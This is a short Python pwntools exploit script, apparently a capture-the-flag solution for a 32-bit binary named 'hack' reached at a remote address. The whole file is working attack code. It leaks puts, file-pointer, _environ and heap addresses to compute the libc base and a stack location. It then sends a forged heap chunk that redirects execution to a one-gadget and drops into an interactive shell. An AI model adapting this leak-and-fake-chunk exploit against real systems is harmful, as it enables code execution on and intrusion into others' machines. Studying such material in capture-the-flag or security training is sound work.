from pwn import *
#context.log_level = "debug"

REMOTE = 1
if REMOTE:
    sh = remote("210.32.4.16", 13375)
else:
    sh = process("./hack", env={"LD_PRELOAD":"./libc.so"})

elf = ELF("./hack")
libc = ELF("./libc.so")

leak = sh.recvline().split(" ")[-1]
puts_leak = int(leak.strip(), 16)

log.success("puts leak address: %s" %hex(puts_leak))
sh.recv()

sh.sendline(str(elf.bss()))

leak_file_ptr = int(sh.recvline().split(" ")[-1], 16)
log.success("leak file ptr: %s" %hex(leak_file_ptr))

libc_base = leak_file_ptr - 1770912
log.success("libc_base %s" %hex(libc_base))

sh.recv()
env_addr = libc_base + libc.symbols["_environ"]
sh.sendline(str(env_addr))
stack_leak = int(sh.recvline().split(" ")[-1].strip(), 16)
log.success("stack leak address: %s" %hex(stack_leak))
stack_addr = stack_leak - 180 -4
log.success("stack we need to use: %s" %hex(stack_addr))

one = 0x3a819
one_addr = one+libc_base
log.success("one gadget's address: %s" %hex(one_addr))

heap = int(sh.recv().split(" ")[6][:-1], 16)
log.success("heap address: %s" %hex(heap))

#gdb.attach(sh, "b *0x8048702")
fake_chunk = p32(one_addr)
fake_chunk += p32(one_addr)
fake_chunk += p32(heap+4)
fake_chunk += p32(stack_addr-8)
sh.send(fake_chunk)
print "send finished"
#gdb.attach(sh)
sh.interactive()
